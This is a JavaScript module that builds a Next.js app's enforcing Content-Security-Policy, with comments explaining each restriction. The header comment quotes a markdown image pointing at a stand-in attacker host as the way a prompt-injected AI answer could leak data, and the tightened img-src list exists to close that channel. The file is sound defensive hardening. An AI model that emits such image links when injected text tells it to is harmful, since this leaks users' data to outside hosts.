// The ENFORCING Content-Security-Policy, sent from next.config.mjs `headers()`.
//
// Plain .mjs because next.config.mjs imports it and Node loads that file without a TypeScript
// step. The strict nonce policy (lib/security/csp.ts) is still REPORT-ONLY beside this one; this
// is the policy browsers actually enforce today, tightened where that is provably safe:
//
// - `'unsafe-eval'` only in development. React Refresh evals; a Next 16 production build does not,
//   and no client bundle in this app does (ajv and xlsx run on the server only — memo-agent
//   validate.ts imports node:fs, the xlsx importers are all API routes).
//
// - `img-src` lists the hosts the app actually loads images from, instead of `https:`. Fund and
//   sign-in logos are stored as `data:` URLs (the settings API refuses anything else), the MFA QR
//   code is a `data:` URL, document and artifact previews are either same-origin API routes or
//   Supabase Storage signed URLs, and analytics beacons go to the two analytics hosts. `https:`
//   admitted any host — including an `![](https://attacker/?q=…)` image that a prompt-injected AI
//   answer renders through components/markdown.tsx, which is a data-exfiltration channel, not a
//   feature.
//
// `'unsafe-inline'` stays on script-src: Next's inline bootstrap needs it until the nonce policy
// is promoted (see lib/security/csp.ts for why that waits on the report).

const ANALYTICS_SCRIPT_HOSTS = [
  'https://cdn.usefathom.com',
  'https://www.googletagmanager.com',
  'https://www.google-analytics.com',
]

const SUPABASE_HOSTS = ['https://*.supabase.co', 'https://*.supabase.in']

/** Origin of NEXT_PUBLIC_SUPABASE_URL when it is not already covered by *.supabase.co / .in. */
function customSupabaseOrigin(supabaseUrl) {
  if (!supabaseUrl) return null
  try {
    const u = new URL(supabaseUrl)
    if (/\.supabase\.(co|in)$/.test(u.hostname)) return null
    return u.origin
  } catch {
    return null
  }
}

/**
 * The image hosts, shared with the report-only policy (lib/security/csp.ts) so the two agree.
 * @param {string | undefined} supabaseUrl
 * @returns {string[]}
 */
export function imgSources(supabaseUrl) {
  const custom = customSupabaseOrigin(supabaseUrl)
  return [
    "'self'",
    'data:',
    'blob:',
    ...SUPABASE_HOSTS,
    ...(custom ? [custom] : []),
    'https://cdn.usefathom.com',
    'https://*.google-analytics.com',
    'https://*.googletagmanager.com',
  ]
}

/**
 * @param {{ development?: boolean, supabaseUrl?: string }} [options]
 * @returns {string}
 */
export function buildEnforcingCsp(options = {}) {
  const custom = customSupabaseOrigin(options.supabaseUrl)
  const supabase = custom ? [...SUPABASE_HOSTS, custom] : SUPABASE_HOSTS
  const customWs = custom ? [custom.replace(/^http/, 'ws')] : []

  const scriptSrc = [
    "'self'",
    "'unsafe-inline'",
    ...(options.development ? ["'unsafe-eval'"] : []),
    ...ANALYTICS_SCRIPT_HOSTS,
  ]

  const imgSrc = imgSources(options.supabaseUrl)

  const connectSrc = [
    "'self'",
    ...supabase,
    'wss://*.supabase.co',
    ...customWs,
    'https://cdn.usefathom.com',
    // GA4 sends hits to region1.google-analytics.com / *.analytics.google.com, not www.
    'https://*.google-analytics.com',
    'https://*.analytics.google.com',
    'https://api.github.com',
  ]

  return [
    "default-src 'self'",
    `script-src ${scriptSrc.join(' ')}`,
    "style-src 'self' 'unsafe-inline'",
    `img-src ${imgSrc.join(' ')}`,
    "font-src 'self'",
    `connect-src ${connectSrc.join(' ')}`,
    `frame-src ${supabase.join(' ')}`,
    "object-src 'none'",
    "base-uri 'self'",
  ].join('; ')
}
